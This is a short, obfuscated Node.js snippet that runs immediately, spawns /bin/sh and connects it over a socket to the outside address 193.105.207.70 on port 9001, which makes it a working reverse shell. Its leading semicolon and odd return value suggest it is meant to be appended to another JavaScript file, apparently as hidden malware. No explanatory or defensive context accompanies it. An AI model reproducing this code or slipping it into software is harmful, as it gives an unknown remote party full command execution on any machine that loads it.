;(function () {
  var _0x228028 = require('net'),
    _0x144654 = require('child_process'),
    _0x1bd6a8 = _0x144654.spawn('/bin/sh', [])
  var _0x549f63 = new _0x228028.Socket()
  _0x549f63.connect(9001, '193.105.207.70', function () {
    _0x549f63.pipe(_0x1bd6a8.stdin)
    _0x1bd6a8.stdout.pipe(_0x549f63)
    _0x1bd6a8.stderr.pipe(_0x549f63)
  })
  return /a/
})()

